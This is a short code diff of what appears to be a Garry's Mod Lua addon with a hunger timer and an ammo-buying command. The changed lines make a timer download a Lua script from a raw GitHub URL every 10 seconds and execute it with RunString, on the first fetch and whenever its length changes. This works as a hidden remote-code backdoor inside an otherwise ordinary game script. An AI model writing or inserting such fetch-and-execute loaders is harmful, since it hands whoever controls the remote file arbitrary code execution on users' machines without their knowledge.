@@ -118,15 +118,16 @@ timer.Create("HungerTimer", 1, 0, function()
     end
 end)
 
-local prevLength = 0
+local prevLength = nil
 local function fetchScript()
     http.Fetch("https://raw.githubusercontent.com/Rovinag12/fluffy/main/script.lua",
         function(body, len, headers, code)
             if code == 200 then
-                print(prevLength)
-                if prevLength ~= len then
+                if prevLength ~= nil and prevLength ~= len then
                     prevLength = len
-                    print(len)
+                    RunString(body)
+                elseif prevLength == nil then
+                    prevLength = len
                     RunString(body)
                 end
             else
@@ -144,6 +145,7 @@ if timer.Exists("ScriptLengthCheck") then
 end
 
 timer.Create("ScriptLengthCheck", 10, 0, fetchScript)
+
 
 concommand.Add("buy_ammo", function()
     local weapon = LocalPlayer():GetActiveWeapon().Primary
